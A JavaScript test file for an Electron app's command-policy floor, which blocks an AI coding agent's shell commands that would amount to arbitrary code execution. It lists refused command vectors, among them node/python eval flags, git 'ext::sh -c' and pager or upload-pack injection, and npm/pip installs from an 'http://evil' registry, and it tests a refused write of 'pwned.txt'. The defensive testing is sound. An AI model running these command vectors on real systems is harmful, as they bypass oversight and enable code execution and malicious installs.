'use strict';
/* The main-process floor under the agent's command policy (electron/lib/cmdpolicy.js, enforced in proc.js).
 * Even if the renderer is wrong or compromised, an allowlisted program must not be turned into arbitrary
 * code execution, a global/config change, or a publish. */
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { hardRefusal } = require('../electron/lib/cmdpolicy');
const proc = require('../electron/lib/proc');

function loadClassifier() {
  const win = { console, setTimeout, clearTimeout, localStorage: { getItem: () => null, setItem() {} } };
  win.window = win;
  const ctx = vm.createContext(win);
  for (const f of ['app.chat.agent.js', 'engine.nagent.js']) vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'dist', f), 'utf8'), ctx, { filename: f });
  return win.Engine.NativeAgent;
}

module.exports = async function (t) {
  const refused = [
    ['node', ['-e', 'process.exit()']], ['node', ['--eval=1']], ['node', ['-p', '1']], ['node', ['-r', './x.js', 'app.js']], ['node', ['--require', 'x', 'app.js']],
    ['node', ['--import', 'x', 'app.js']], ['node', ['--inspect', 'app.js']], ['node', ['--inspect-brk=9229', 'app.js']], ['node', ['-i']], ['deno', ['eval', '1']],
    ['python', ['-c', 'print(1)']], ['python3', ['-ic', 'x']], ['python', ['-i']],
    ['npm', ['install', '-g', 'x']], ['npm', ['i', '--global', 'x']], ['pnpm', ['add', '-g', 'x']], ['npm', ['publish']], ['npm', ['login']], ['npm', ['config', 'set', 'x', 'y']],
    ['npm', ['install', '--registry=http://evil']], ['npm', ['run', 'build', '--script-shell=cmd']], ['yarn', ['npm', 'publish'].slice(0, 0).concat(['config'])],
    ['git', ['-c', 'core.pager=calc', 'log']], ['git', ['-C', '..', 'status']], ['git', ['--git-dir=/x', 'status']], ['git', ['--exec-path=/x', 'status']],
    ['git', ['clone', 'ext::sh -c x']], ['git', ['fetch', '--upload-pack=calc']], ['git', ['config', 'core.sshCommand', 'calc']],
    ['cargo', ['publish']], ['pip', ['install', '--index-url', 'http://evil', 'x']], ['pip3', ['install', '--break-system-packages', 'x']],
    ['node', ['a\u0000b']]
  ];
  for (const [cmd, args] of refused) t.ok('refused: ' + cmd + ' ' + JSON.stringify(args).slice(0, 60), typeof hardRefusal(cmd, args) === 'string');

  const allowed = [
    ['node', ['app.js', '-e', 'x']], ['node', ['--test']], ['node', ['test.js', '--require', 'foo']], ['node', ['--version']],
    ['npm', ['test']], ['npm', ['run', 'build', '--', '-g']], ['npm', ['install']], ['npm', ['ci']], ['npx', ['vite', 'build']],
    ['git', ['log', '-c']], ['git', ['diff', '-C']], ['git', ['commit', '-m', 'x']], ['git', ['status']], ['git', ['add', '.']],
    ['python', ['script.py', '-c', 'cfg']], ['python', ['-m', 'pytest', '-c', 'cfg']], ['pip', ['install', '-r', 'requirements.txt']],
    ['cargo', ['build']], ['cargo', ['test']], ['tsc', ['--noEmit']], ['go', ['test', './...']], ['make', ['build']]
  ];
  for (const [cmd, args] of allowed) t.ok('not refused: ' + cmd + ' ' + JSON.stringify(args).slice(0, 60), hardRefusal(cmd, args) === null);
  t.ok('works through .cmd / .exe names and paths', typeof hardRefusal(path.join(path.sep, 'Program Files', 'nodejs', 'node.exe'), ['-e', 'x']) === 'string' && typeof hardRefusal('/usr/bin/git', ['-c', 'a=b', 'log']) === 'string');

  // enforced where commands actually start, before anything runs
  const r = await proc.runManaged({ cmd: 'node', args: ['-e', 'require("fs").writeFileSync("pwned.txt","x")'], cwd: '.' });
  t.ok('proc.runManaged refuses it without starting a process', r.code === -1 && /Refused/.test(r.stderr));
  let err = null; try { proc.spawnAllowed({ cmd: 'npm', args: ['install', '-g', 'x'], cwd: '.' }, () => {}); } catch (e) { err = e; }
  t.ok('proc.spawnAllowed throws EREFUSED', !!err && err.code === 'EREFUSED');

  // the renderer's classifier must never be MORE permissive than the floor: whatever the floor refuses, the renderer
  // either refuses too or at least does not run it as plain exec/read
  const NA = loadClassifier();
  const gaps = refused.filter(([cmd, args]) => { const c = NA.classifyCommand(cmd, args); return !c.deny && (c.perm === 'exec' || c.perm === 'read'); });
  t.deepEqual('no command the main process refuses is run as plain exec/read by the agent policy', gaps.map(([c, a]) => c + ' ' + a.join(' ')), []);
};
